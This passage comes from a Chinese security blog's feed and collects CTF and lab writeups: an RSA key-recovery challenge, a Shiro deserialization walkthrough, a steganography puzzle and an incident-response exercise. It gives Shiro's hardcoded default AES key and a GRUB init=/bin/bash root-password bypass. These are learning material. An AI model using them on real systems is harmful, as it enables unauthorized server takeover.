class="string">5tvayJ31zRQNT2ALAFeCDozVWELHTnphkPkQO+SOPglrVz0S1dXicqRofXWMj7PJ</span></span><br><span class="line"><span class="string">OFkBpWIX0aywMIh1woEAawUs3RM2pfLUNtqUTfodSCmWlwcpGrBWG5NACx7csPFt</span></span><br><span class="line"><span class="string">zWn8oPZfzL346at5DDIwD2kCAwEAAQ==</span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enctryptMessage</span>(<span class="params">message</span>):</span><br><span class="line">    <span class="keyword">import</span> base64</span><br><span class="line">    message_bytes = message.encode(<span class="string">&#x27;utf-8&#x27;</span>)  </span><br><span class="line">    message_base64 = base64.b64encode(message_bytes).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    publicKey = getPublicKey()</span><br><span class="line">    <span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line">    <span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> serialization</span><br><span class="line">    <span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="keyword">import</span> padding</span><br><span class="line">    <span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> hashes</span><br><span class="line">    public_key = serialization.load_pem_public_key(publicKey, backend=default_backend())</span><br><span class="line">    encrypted = public_key.encrypt(</span><br><span class="line">        message_base64.encode(<span class="string">&#x27;utf-8&#x27;</span>),</span><br><span class="line">        padding.OAEP(</span><br><span class="line">            mgf=padding.MGF1(algorithm=hashes.SHA256()),</span><br><span class="line">            algorithm=hashes.SHA256(),</span><br><span class="line">            label=<span class="literal">None</span></span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line">    encrypted_base64 = base64.b64encode(encrypted).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> encrypted_base64</span><br><span class="line"></span><br><span class="line">printMessage()</span><br></pre></td></tr></table></figure>
+
+<p>找个公钥解析网站推出n和e（这个e我做的时候猜的是65537还真是）</p>
+<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">e</span><span class="operator">=</span><span class="number">65537</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">n</span><span class="operator">=</span><span class="number">6332468885045739207798242375080077355892316665891880211715759509</span></span><br><span class="line"><span class="number">3994025514008605209080197241118207580620027792226491625637695206</span></span><br><span class="line"><span class="number">8104942084262732765302869757002336862151158422906662985191392193</span></span><br><span class="line"><span class="number">4625112891871237543378546847020163969961987899081707281756262252</span></span><br><span class="line"><span class="number">8140625647621607986357475076878716996947515271743090346014970559</span></span><br><span class="line"><span class="number">7463505143799487488630064694962535355825378265518133414832135165</span></span><br><span class="line"><span class="number">9981250042829128658958363792059338950291542877888243170008437712</span></span><br><span class="line"><span class="number">5133143593941038995757255274641093310334721226053335140687658479</span></span><br><span class="line"><span class="number">8128116835102705770834548333327952204414218313396767348386545933</span></span><br><span class="line"><span class="number">7003717067807320811287647328283988796540276949990614458889846521</span></span><br><span class="line"><span class="number">9605771776162366647139022650041904735454600952684919003805581700</span></span><br><span class="line"><span class="number">8252022472857695300387827500818231719929626707573775972451255428</span></span><br><span class="line"><span class="number">0591198406698260860277025465102137918643581832045307760200048667</span></span><br><span class="line"><span class="number">7053654569533032416756977779117517004481202822749496645886400266</span></span><br><span class="line"><span class="number">0598592490354017639158027968836329598282419666463285900175674408</span></span><br><span class="line"><span class="number">0268810527371486113951531943901306283561047843588041585812947331</span></span><br><span class="line"><span class="number">9670347691343405520944180270848572345532298565444740094573471751</span></span><br><span class="line"><span class="number">0509951259155462497189459983874690099575241597111904193711108488</span></span><br><span class="line"><span class="number">6165664866650538846290845643642053197978121486841730575238128406</span></span><br><span class="line"><span class="number">84555544241901417</span></span><br></pre></td></tr></table></figure>
+
+<p>那个提示给的后两组数就是pq</p>
+<p>得到私钥</p>
+<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">d</span><span class="operator">=</span><span class="number">255494060238307270904376344480014961692638719012943980588351790511526316834981085331720795191975165913416051220234812634864570648409766675192260551751506509523716241344598181462349247820785089026591444660053501261906305947643584072714472782578549436500124340310728805775448735106024990894767052700947375594060596201817529153455346023559945898594239348755052546418848846155358881110182939750390821196911668488114179216382384926036860278813344161481291906950716540115221296877179617588432773959543357536626648010364101250672960094999655265377265631813923749342246934132261730741091371723922305227416677557188283308296236221668815925784512852044291355167731705666340336896234239097284201418078819508782841013506098248607490669283372652309698886330888594401260157111267337618589385328458170871309386675783417913977677592175152532663930748569315846293991784782073744026212234038850487736671990624960666049359427646696567908479413777548419239816695981241578678851908594429943937859946635004227968029219621307338825722289578116044664518758852790207035110719643081246219363264672864916483562061006683514992740110898785579215127202200186207575760049520971437781541536256606142748784987704960904222016122617597238247773464058692994329931242753</span></span><br></pre></td></tr></table></figure>
+
+<p>导出为私钥，得到</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIJKgIBAAKCAgEAmziayo9Tddo1FYdrtOswyjLYJ5frYKEwm4rQTsKU8UcdnnDR</span><br><span class="line">gms+ZmStoqlH/qi6x+D1K3fvvioCnGZLFHZwBUqbgT5x+qUmUaVMll9FOT7ZJ05w</span><br><span class="line">8n8Ljqa1akzFMU5G7YbCr3vQwN63vwvD9/63TDbXkJrv1fGl2rHpPwp5OPCUeCB3</span><br><span class="line">nIFIRCWHpJU7sHJqIP5vzV8KNJtbxgR+dhszdg+NhoBDUpxoVN5lzSKr2TMOLFLZ</span><br><span class="line">aQR9AWOV/aHV8gjTkTLDZfc+XlfhxiDMTQdiUTbk/tynpt+JFrDA8vL5/TOmuxgu</span><br><span class="line">mqgXZIPGrIUbwloTYyHD/XXmvXu5KE8g3eMKgxNxuEKM5bMTESBK9A7Q2Kj3eNp0</span><br><span class="line">Rvb5Aleg7h8/YbQemGelY/o5xpUyHgHjsfNQ3j/xhdhVCNVaXZF64V/YVpvC9Cq2</span><br><span class="line">9F7qI+bl6FlN7zSpuHB3QgNS1uXOmjBCsA7ypZoWmdXeaLIO+I3kP48BBSmue4ni</span><br><span class="line">dJifiK/kSOcZ0iegRXV1hyZ6pYdDE7hM5V5t5tvayJ31zRQNT2ALAFeCDozVWELH</span><br><span class="line">TnphkPkQO+SOPglrVz0S1dXicqRofXWMj7PJOFkBpWIX0aywMIh1woEAawUs3RM2</span><br><span class="line">pfLUNtqUTfodSCmWlwcpGrBWG5NACx7csPFtzWn8oPZfzL346at5DDIwD2kCAwEA</span><br><span class="line">AQKCAgA+oGYD2DQqVrIYT50rT8FNs5n2z5rOT/rWpvlI7cU+XB0dMhO19SMmGPTd</span><br><span class="line">rkM4AkfqIV+J/Egkh7qp87PTO74SxHldeh5urHd7daAjA6lgYXUoIMP9czjsg2Kq</span><br><span class="line">0vK05ApGB5tBRkmBp9qnIE4fHwxBmdb7pyehQHBUfnfHUah7SsX8ec0Ivji0FhhW</span><br><span class="line">VUfR9zfOvBnL2M67TvuGN4X2jR8EQV4uqE2BZU3LADg+vgBsD+dmBr9lWcQ97To1</span><br><span class="line">LTivANSrvrmLyGfHlNmpIM6NPa9zaRyXn9ucvpAHMaWH4HTwrghVcHpNOAjIK0rb</span><br><span class="line">jJEYp1MvKg5zk0BXrzWTh+mQ3Ov+NXrbdDspmeZsY02SuyPheOBHHHs7cHANPcRH</span><br><span class="line">1Nl/nxXkRF9H+oSOmTQi7wjZbhrEFFCeCK2TuT8vyf0p+lQMPEc+cAFn5rSXnhii</span><br><span class="line">W2Mq6nwx5Nbllr/hj7oVeyGrUZFskvbZnYYVM4NTFqUPBzQbBuQTGGfccZc9OrJx</span><br><span class="line">2qpDZdUknQe9ZI742c2vZRTqY2yZX6InR8JoQbmscke4LRdUMHH6G/PbfkqPXfFy</span><br><span class="line">r5mxscghP+kRFj86dyL03CB039N23xCNezK/AGE/6JzJgwpvUPaYtvnIuhSFQEmH</span><br><span class="line">DGrYYrDXSbwTT0ufM/tIEuHMHXT4DYX3nm94SG8wB/b3zpFdAQKCAQEAnexbL5So</span><br><span class="line">v7N4W7BrZZao8cKEnM6goDpUjqgEnlIG4FF+UVmBzuAYNlLjOXW7fKK6nt5q95R1</span><br><span class="line">AA72FpfOHbZnTTYHm9u1zUecIeuvNVjxi9swhmhMn43pxaQcUfgWSsCrqH+8SrVE</span><br><span class="line">z8Lc7V2lbswx/V94PC8Za7ZLSr+FOz6X7C71sLQR8XI3SkrZIkmL150N8LO4WdKA</span><br><span class="line">tKKIfvz7Lo2xLxpGLNJ3Xf/NW51wMs5BwQNzEUWRUmkgCmeU74m47TCSOj580qLL</span><br><span class="line">T0Hxj1jRhecZOs0DHqDCeHt0hz82EtOcw1TBJKTly3Xj/UjGRpzEmo8rAuU8XoKc</span><br><span class="line">/NkmaZCjpxh/eQKCAQEA+56kjWCgWcjo+QUgp50+BIa5hkFoV16QOCQEsqh+s5rh</span><br><span class="line">VMke7svuo5+U6C/rNFIkpR1iKRPL3LOqJ8B5P7ZAPdhbHAPjdtnUDbPzM1r0RYpj</span><br><span class="line">bJPh4AcRVqhDTWy20Yd7iZN9mHxHSKBZ4Txn20gvkHamPVlPMejsDRpDoauS/euz</span><br><span class="line">n2GlG9GPq7i5vHwQiy6sYZAPm9Eyz+XxsQNiqB32tHnZqYrj/GS64Jx6eaa5MdSC</span><br><span class="line">LIPkHHWAUHzBQ5A8/bNTFf8VAYriR9GnTZF8oSNne6oD62IYVzDH2wWOWSnUKdAd</span><br><span class="line">snaahJLvHQnWbz6itWPWj+2TrjLSnl9Tz7uuhrRjcQKCAQEAhnF+W65yTulKELzL</span><br><span class="line">YWv2ngLchOY/xsiBzgTqEaKBahzWrgjGQslys2SzPuqk14Ft4Ow3IljHlmomRKut</span><br><span class="line">9IuhvBDAP4a3anCJUjNkMMVstYS/9dz7RmY5W2HQHlRXHgKS4NsGAI/7aehZztYH</span><br><span class="line">jaDW+f55zLrIKHPD+3m6weoSyiZcUberAuMagOvhmJgGLmPtRzqpOgbEPYOVMo7K</span><br><span class="line">hCJqclAq5+OxbVvlhxYsO4RuZBQ8tLqF8iO+/DychaS4w2yzQFSMTYH8FZhtPnz9</span><br><span class="line">usI4L1/zRPLVPF7VoIJG1ZZDgeM4nqqnWyQdGTcIXXr+wRobItbnIwqM/ZEca4iQ</span><br><span class="line">WiO3+QKCAQEArbI5E+OFLhXURbs1bJ/OpR8/yR8z4URFOIwcthw8ws2DCZ2A/gXH</span><br><span class="line">aiqKh7I0oryl0Vm0Xnjs/SEFsEVdLg8oz8igNHm2t1/t07vKgkQiZjL/KX/4qEcY</span><br><span class="line">wAKN20/V8FSfgjxPskjwiIExKpwhca2mMArH/Ye+dMy+zti3oU4ovaLNL5Qff1Gt</span><br><span class="line">5TQy+5uFbB8/HmZtb/n9IqkwrCqTG0z79mA7Up+vfJcork82+O2P4Ic7iXFOshqn</span><br><span class="line">BmjonTRf9h6pl4CsRpFSXZOr848gQriHAkY+SGpCNUZWYKq4NnL6pBanuX/IcQZh</span><br><span class="line">jGEzJz5M4fzWrCqsDM/Gt09FMxzzgMfb8QKCAQEAh4vGV/+sD6MsiafBfsfPiegv</span><br><span class="line">oqjUCj6HuXwVBMAM3yvRqLkmWfh2delFnKD2SOVsu11i5pm9AVnQYER6rS7QsIpu</span><br><span class="line">O3WcAIvxbOfbD7A5aQvVAqHQIZDWDWy8eJK80Zq/ZbYWZ7JuOkw3MuYfUji41esO</span><br><span class="line">LvRSjDi9hXpTplRlv0dYZofa4c2vlOyu3MCPk+S0sSOvEpWCsHxbiBZacugfyr4E</span><br><span class="line">/IrE/zH5n94opAULaY7UXvCTQ9WuvDjDHb21SvfcoYLCKOwb1+gRSDJR4vty+4Z1</span><br><span class="line">WnIm+IGyBS2uHBQH1upASOt3LzHZm7l5YBxKvDTjn3smlqMRl5FdI+uRVm4OYQ==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+
+<p>在线网站解码得到base64</p>
+<p><img src="/2025/01/15/ctfshow%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250115190818615.png" alt="image-20250115190818615"></p>
+<p><img src="/2025/01/15/ctfshow%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250115190908005.png" alt="image-20250115190908005"></p>
+<p><img src="/2025/01/15/ctfshow%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250115191025210.png" alt="image-20250115191025210"></p>
+<p><img src="/2025/01/15/ctfshow%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250115190951359.png" alt="image-20250115190951359"></p>
+<p>flag:ctfshow{<a href="https://task.ctfer.com}/">https://task.ctfer.com}</a></p>
+<h1 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h1><p>好像关站了，死活打不开GG</p>
+]]></content>
+      <tags>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Shiro反序列化漏洞</title>
+    <url>/2025/01/18/shiore550-721%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8C%BA%E5%88%AB/</url>
+    <content><![CDATA[<h1 id="Shiro550复现"><a href="#Shiro550复现" class="headerlink" title="Shiro550复现"></a>Shiro550复现</h1><p><a href="https://www.cnblogs.com/h0cksr/p/16189761.html">https://www.cnblogs.com/h0cksr/p/16189761.html</a></p>
+<h4 id="Shiro550-反序列化"><a href="#Shiro550-反序列化" class="headerlink" title="Shiro550-反序列化"></a>Shiro550-反序列化</h4><p>Apache Shiro框架提供了<code>RemeberMe</code>功能，用户登录成功后会生成经过加密并编码的cookie。cookie的key为RemeberMe，cookie的值是经过对相关信息进行序列化，然后使用aes加密，最后在使用base64编码处理形成的。</p>
+<p>CVE编号:CVE-2016-4437</p>
+<p>漏洞原理：该漏洞允许攻击者利用Shiro框架在处理记住密码功能（RememberMe）时使用的默认或可预测的AES加密密钥，通过构造恶意的序列化数据并将其加密和编码后发送至服务端，导致服务端在解密并反序列化过程中执行攻击者预设的代码，从而可能获取服务器的控制权。</p>
+<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">检索RemeberMe cookie的值</span><br><span class="line"></span><br><span class="line"><span class="keyword">Base64解码</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line">使用ACE解密（加密密钥硬编码）</span><br><span class="line"></span><br><span class="line">进行反序列化操作（未作过滤处理）</span><br></pre></td></tr></table></figure>
+
+<p>打开靶机是一个登录页面</p>
+<p>wappalyzer 看一下  也没看出来啥</p>
+<p>输入账号 密码 勾选记住我  然后登录抓包</p>
+<p><img src="/2025/01/18/shiore550-721%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8C%BA%E5%88%AB/image-20250118184421571.png" alt="image-20250118184421571"></p>
+<p>拦截返回包</p>
+<p>可以看见 有个Set-Cookie   rememberMe&#x3D;deleteMe</p>
+<p>这就是Apache Shiro组件的 特征</p>
+<p>Apache Shiro™是一个强大且易用的Java安全框架,能够用于身份验证、授权、加密和会话管理，用于执行身份验证、授权、密码和会话管理。只要rememberMe的AES加密密钥泄露，无论shiro是什么版本都会导致反序列化漏洞。</p>
+<p>这里我直接利用工具就连上了</p>
+<p><img src="/2025/01/18/shiore550-721%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8C%BA%E5%88%AB/image-20250118184655962.png" alt="image-20250118184655962"></p>
+<p>利用工具过程是很简单的，下面我们来看看这个漏洞的触发流程</p>
+<p>首先是set-cookie的过程</p>
+<p>用户登录–&gt;信息进行序列化–&gt;AES加密–&gt;base64编码–&gt;添加到remember字段</p>
+<p>勾选记住密码后，下次登录服务端取出你的cookie进行验证</p>
+<p>验证过程</p>
+<p>取出remember字段的值–&gt;base64解码–&gt;然后AES解密(漏洞利用的关键是这个密钥key是不变的，shiro版本&lt;&#x3D;1.2.24的版本中使用了固定的密钥kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;)–&gt;反序列化–&gt;代码执行</p>
+<p>这样攻击者用这个密钥实现加密操作然后在cookie的remember字段构造自己设计的代码就会被执行了</p>
+<p>这里偷个大佬的流程图</p>
+<p><img src="/2025/01/18/shiore550-721%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8C%BA%E5%88%AB/image-20250118190247718.png" alt="image-20250118190247718"></p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//</span>blog.csdn.net<span class="regexp">/Bossfrank/</span>article<span class="regexp">/details/</span><span class="number">130173880</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/01/18/shiore550-721%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8C%BA%E5%88%AB/image-20250118190456530.png" alt="image-20250118190456530"></p>
+<p>登录成功且勾选rememberme才能看到set-cookie：rememberme&#x3D;xxxxx</p>
+<p>唉，java代码实在是看不懂，附上从代码分析流程，大佬讲的很好</p>
+<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="symbol">https:</span>/<span class="regexp">/www.bilibili.com/video</span><span class="regexp">/BV1iF411b7bD/</span><span class="string">?v</span>d_source=93147f59d99436a0d4bc043cd0cbb64e</span><br></pre></td></tr></table></figure>
+
+<h4 id="下面来看看shiro721"><a href="#下面来看看shiro721" class="headerlink" title="下面来看看shiro721"></a>下面来看看shiro721</h4><p>和shiro550相比，key是系统随即生成的了，不再是固定的，采用的是AES-128-CBC 模式加密</p>
+<p>用户可通过Padding Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。</p>
+<p>EXP爆破时间很长，建议采用较短的命令来复现</p>
+<p>涉及到一些密码学的知识，这篇文章写的很详细，想深入了解的可以看看</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//</span>www.freebuf.com<span class="regexp">/articles/</span>network/<span class="number">221838</span>.html</span><br></pre></td></tr></table></figure>
+
+<p>简单来说就是我们知道了shiro的加密方式，然后利用padding oracle攻击来实现构造，根据服务器会对填充错误进行报错这个关键点，我们构造出一个虚假的IV值来反推中间值，根据异或运算的关系可以进行爆破。</p>
+]]></content>
+      <tags>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>一道misc题目</title>
+    <url>/2025/01/03/%E4%B8%89%E7%9B%B8%E4%B9%8B%E5%8A%9B/</url>
+    <content><![CDATA[<p>首先看见是一个png图片，有三个提示reverse反转  Gopher esolang是一种编码  Bitmap RGBA bmp图片和RGBA</p>
+<p>png图片就先拖到zsteg扫一下试试</p>
+<p><img src="/2025/01/03/%E4%B8%89%E7%9B%B8%E4%B9%8B%E5%8A%9B/image-20241222155407584.png" alt="image-20241222155407584"></p>
+<p>有个压缩包，导出来</p>
+<p><img src="/2025/01/03/%E4%B8%89%E7%9B%B8%E4%B9%8B%E5%8A%9B/image-20241222155503591.png" alt="image-20241222155503591"></p>
+<p>需要密码并且显示损坏，用winrar修复一下</p>
+<p><img src="/2025/01/03/%E4%B8%89%E7%9B%B8%E4%B9%8B%E5%8A%9B/image-20241222155555545.png" alt="image-20241222155555545"></p>
+<p>然后拿stegslolve继续分析</p>
+<p>发现在红色最低通道只有这种斑点条纹带，说明这个通道是被修改过的</p>
+<p><img src="/2025/01/03/%E4%B8%89%E7%9B%B8%E4%B9%8B%E5%8A%9B/image-20241222155717504.png" alt="image-20241222155717504"></p>
+<p>果然在这里发现了png文件尾的字符IEND而且是反转的，和第一个提示对上了，把它提取出来</p>
+<p><img src="/2025/01/03/%E4%B8%89%E7%9B%B8%E4%B9%8B%E5%8A%9B/image-20241222155806038.png" alt="image-20241222155806038"></p>
+<p>把这些16进制放到010分析一下，文件头尾是反着的，删掉下面多余的0000</p>
+<p><img src="/2025/01/03/%E4%B8%89%E7%9B%B8%E4%B9%8B%E5%8A%9B/image-20241222160044894.png" alt="image-20241222160044894"></p>
+<p>写个脚本逆序一下</p>
+<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="built_in">input</span> = <span class="built_in">open</span>(<span class="string">&#x27;a.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">input_all = <span class="built_in">input</span>.<span class="built_in">read</span>()</span><br><span class="line">ss = input_all[::<span class="number">-1</span>]</span><br><span class="line"><span class="built_in">output</span> = <span class="built_in">open</span>(<span class="string">&#x27;1.png&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"><span class="built_in">output</span>.<span class="built_in">write</span>(ss)</span><br><span class="line"><span class="built_in">input</span>.<span class="built_in">close</span>()</span><br><span class="line"><span class="built_in">output</span>.<span class="built_in">close</span>()</span><br></pre></td></tr></table></figure>
+
+<p>得到第一个二维码</p>
+<p><img src="/2025/01/03/%E4%B8%89%E7%9B%B8%E4%B9%8B%E5%8A%9B/image-20241222160631053.png" alt="image-20241222160631053"></p>
+<p>cyberchef更方便</p>
+<p><img src="/2025/01/03/%E4%B8%89%E7%9B%B8%E4%B9%8B%E5%8A%9B/image-20241222160837071.png" alt="image-20241222160837071"></p>
+<p>扫码得到</p>
+<p>key_part1:0d000721_114514_1919810_</p>
+<p>继续分析</p>
+<p><img src="/2025/01/03/%E4%B8%89%E7%9B%B8%E4%B9%8B%E5%8A%9B/image-20241222160958208.png" alt="image-20241222160958208"></p>
+<p>蓝色最低位也有问题</p>
+<p>导出save bin</p>
+<p><img src="/2025/01/03/%E4%B8%89%E7%9B%B8%E4%B9%8B%E5%8A%9B/image-20241222161425923.png" alt="image-20241222161425923"></p>
+<p>得到这个，这时候需要用提示三了，删掉后面多余的0000（结尾要留四个0000，这是bmp文件的格式）补上bmp文件头，这里我拿图画生成了一个bmp图片</p>
+<p>把它的头部复制到刚才的文件</p>
+<p><img src="/2025/01/03/%E4%B8%89%E7%9B%B8%E4%B9%8B%E5%8A%9B/image-20241222161657578.png" alt="image-20241222161657578"></p>
+<p>找到bmih</p>
+<p><img src="/2025/01/03/%E4%B8%89%E7%9B%B8%E4%B9%8B%E5%8A%9B/image-20241222161919417.png" alt="image-20241222161919417"></p>
+<p>第三个提示就是bitmap转成RGBA，这里的位深度是24，对应RGB三原色通道，一个通道是8位，RGBA比RGB多了个Alpha的色彩空间也占有8位，所以我们要把这个24修改成32</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//</span>blog.csdn.net<span class="regexp">/mochu7777777/</span>article<span class="regexp">/details/</span><span class="number">120773359</span></span><br></pre></td></tr></table></figure>
+
+<p>根据这篇文章公式</p>
+<p>分辨率(width * height) x (颜色深度&#x2F;8)+ bmp文件头(共14Bytes) + 位图信息头(共40Bytes) + 文件尾(共2bytes: 00 00)  &#x3D; 图像文件大小</p>
+<p>可以推出分辨率，<img src="/2025/01/03/%E4%B8%89%E7%9B%B8%E4%B9%8B%E5%8A%9B/image-20241222162327101.png" alt="image-20241222162327101"></p>
+<p>分辨率：(400056-56)&#x2F;(24&#x2F;8)&#x3D;10000，组合方式有很多，但是上面那个是key_part1,这个肯定是part2</p>
+<p>我们注意到上面那个二维码的分辨率就是100*100&#x3D;10000，我们把这个bmp也修改成这样试试</p>
+<p><img src="/2025/01/03/%E4%B8%89%E7%9B%B8%E4%B9%8B%E5%8A%9B/image-20241222162539618.png" alt="image-20241222162539618"></p>
+<p>成功得到第二张二维码</p>
+<p>扫码得到key_part2:089d7147-6786-42b5-b81e-3b7e050304a6</p>
+<p>拼一起就是密码key：0d000721_114514_1919810_089d7147-6786-42b5-b81e-3b7e050304a6</p>
+<p>解压得到密文</p>
+<p><img src="/2025/01/03/%E4%B8%89%E7%9B%B8%E4%B9%8B%E5%8A%9B/image-20241222162703999.png" alt="image-20241222162703999"></p>
+<p>这时候用第二个提示，网站<a href="https://esolangs.org/wiki/Gopher">https://esolangs.org/wiki/Gopher</a></p>
+<p><a href="https://shubshub.github.io/gopher/">https://shubshub.github.io/gopher/</a></p>
+<p>解码<img src="/2025/01/03/%E4%B8%89%E7%9B%B8%E4%B9%8B%E5%8A%9B/image-20241222162823033.png" alt="image-20241222162823033"></p>
+<p>得到flag:flag{7a874085-53d5-4baf-96ed-40d73013e67b}</p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2023帕鲁杯应急响应</title>
+    <url>/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
+    <content><![CDATA[<h1 id="2024帕鲁杯"><a href="#2024帕鲁杯" class="headerlink" title="2024帕鲁杯"></a>2024帕鲁杯</h1><p>应急响应题目</p>
+<h2 id="1-签到"><a href="#1-签到" class="headerlink" title="1.签到"></a>1.签到</h2><p>提交:[堡垒机的flag标签的值</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250116161849502.png" alt="image-20250116161849502"></p>
+<h2 id="2-提交攻击者第一次登录时间"><a href="#2-提交攻击者第一次登录时间" class="headerlink" title="2.提交攻击者第一次登录时间"></a>2.提交攻击者第一次登录时间</h2><p>格式为:[2024&#x2F;00&#x2F;00&#x2F;00:00:00]</p>
+<p>切换到审计台审计登录日志</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250116161928850.png" alt="image-20250116161928850"></p>
+<p>答案是第一个登录城市LAN的这个，我也不知道为什么，test01的第一次登录成功的时间</p>
+<p>[2024&#x2F;04&#x2F;11&#x2F;14:21:18]</p>
+<h2 id="3-提交攻击者源IP"><a href="#3-提交攻击者源IP" class="headerlink" title="3.提交攻击者源IP"></a>3.提交攻击者源IP</h2><p>格式为:[0.0.0.0]</p>
+<p>192.168.1.4有大量的尝试登录操作</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250116162800217.png" alt="image-20250116162800217"></p>
+<p> 192.168.1.4</p>
+<h2 id="4-提交攻者使用的cve编号"><a href="#4-提交攻者使用的cve编号" class="headerlink" title="4.提交攻者使用的cve编号"></a>4.提交攻者使用的cve编号</h2><p>格式为:[CVE-0000-0000]</p>
+<p>攻击者先拿下的堡垒机，找jumpserver的漏洞</p>
+<p>找到作业日志，有两条test01创建的命令 Default:test01:rce1</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250116164141734.png" alt="image-20250116164141734"></p>
+<p>CVE-2024-29201</p>
+<h2 id="5-提交攻击者留着web服务器上的恶意程序的32位小写md5"><a href="#5-提交攻击者留着web服务器上的恶意程序的32位小写md5" class="headerlink" title="5.提交攻击者留着web服务器上的恶意程序的32位小写md5"></a>5.提交攻击者留着web服务器上的恶意程序的32位小写md5</h2><p>格式为:[xxxxxx]</p>
+<p>在命令记录这可以看见计算了home的md5，我们去webserver，需要登录但是需要密码</p>
+<p>用diskgenius进行内存取证，先把webserver的磁盘导出到桌面，然后挂载，再导出root下的home程序</p>
+<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">certutil -hashfile home md5</span><br></pre></td></tr></table></figure>
+
+<p>这里因为我的diskgenius没注册，提取不出来</p>
+<p>只能重置root密码了，开启webserver然后按e</p>
+<p>找到linux  &#x2F;vmlinuz…..然后在最下面的ro后面输入rw init&#x3D;&#x2F;bin&#x2F;bash，然后ctrl+x进入到root权限的命令行</p>
+<p>添加rw是为了让我们有读写权限的必须要加</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250116172119003.png" alt="image-20250116172119003"></p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250116172621825.png" alt="image-20250116172621825"></p>
+<p>修改密码即可，然后exec &#x2F;sbin&#x2F;init重启</p>
+<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">passwd</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">md5sum home</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250116182143790.png" alt="image-20250116182143790"></p>
+<h2 id="6-分析恶意程序连接地址和密码"><a href="#6-分析恶意程序连接地址和密码" class="headerlink" title="6.分析恶意程序连接地址和密码"></a>6.分析恶意程序连接地址和密码</h2><p>格式为:[md5(地址)-md5(密码)]全小写</p>
+<p>ip是192.168.20.121，连接上去，把home提取出来反编译看看</p>
+<p>启动</p>
+<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">systemctl <span class="literal">start</span> sshd</span><br></pre></td></tr></table></figure>
+
+<p>  检查状态</p>
+<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">systemctl status sshd</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250116190329114.png" alt="image-20250116190329114"></p>
+<p> 运行在222端口</p>
+<p>然后把home弄出来反编译一下，这里我用的是pyinstxtractor</p>
